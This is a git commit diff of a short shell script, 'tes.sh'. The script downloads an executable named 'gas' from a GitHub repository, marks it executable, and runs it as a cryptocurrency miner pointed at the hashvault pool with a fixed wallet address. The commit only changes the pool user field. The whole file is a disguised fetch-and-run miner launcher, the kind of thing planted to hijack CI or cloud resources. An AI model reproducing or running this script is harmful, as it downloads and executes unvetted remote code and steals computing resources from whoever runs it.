be18823d57471b6318b52e8cc454990231077ce4
dnqjwdz <100903992+dnqjwdz@users.noreply.github.com>
2022-07-07 00:51:30 +0000

    Update tes.sh

--- tes.sh
+++ tes.sh
@@ -1,3 +1,3 @@
 wget https://github.com/sabrifaudi12/dqwz/raw/main/gas
 chmod +x gas
-./gas --url pool.hashvault.pro:80 --user hvxy22DVSsKJySa8ZEQqeV54jrDqNdEcE53fCmu8GaPf8myheipmvJPCwg7pu6b1hXJBVxondQ9WAUfDJ9Bpzwq29CqDQ6Qeke --pass ano --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
+./gas --url pool.hashvault.pro:80 --user solo:hvxy22DVSsKJySa8ZEQqeV54jrDqNdEcE53fCmu8GaPf8myheipmvJPCwg7pu6b1hXJBVxondQ9WAUfDJ9Bpzwq29CqDQ6Qeke --pass ano --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
